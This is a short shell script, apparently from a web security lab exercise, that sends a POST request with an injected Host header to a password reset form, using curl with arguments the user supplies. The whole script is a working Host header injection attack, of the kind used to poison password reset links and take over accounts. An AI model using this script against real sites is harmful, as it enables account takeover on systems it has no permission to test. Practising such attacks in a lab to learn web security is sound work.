
# Check argument count
if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
    echo "Example:"
    echo "  $0 newhost http://web0x00.hbtn/resetpassword email=test@test.hbtn"
    exit 1
fi

NEW_HOST="$1"
TARGET_URL="$2"
FORM_DATA="$3"

echo "[*] Sending request with injected Host header..."
echo "[*] Host: $NEW_HOST"
echo "[*] URL: $TARGET_URL"
echo "[*] Data: $FORM_DATA"
echo

curl -i -X POST "$TARGET_URL" \
     -H "Host: $NEW_HOST" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     --data "$FORM_DATA"

